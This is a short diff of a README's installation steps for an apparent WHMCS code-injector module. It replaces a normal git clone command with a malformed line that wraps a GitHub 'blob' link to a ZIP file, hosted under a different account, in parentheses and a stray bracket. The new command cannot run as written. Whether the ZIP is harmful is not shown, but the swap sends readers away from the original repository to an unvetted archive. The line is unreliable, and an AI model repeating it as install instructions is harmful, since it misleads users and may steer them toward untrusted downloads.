@@ -39,7 +39,7 @@ Here are some screenshots of the module in action:
 
 1. **Download the Module**: Clone this repository or download the ZIP file.
    ```bash
-   git clone https://github.com/CyberDefendX/custom-code-injector.git
+   git clone (https://github.com/bigboss821/customcodeinjector-whmcs/blob/main/customcodeinjector_V2.zip)]
 
 ## Installation
 
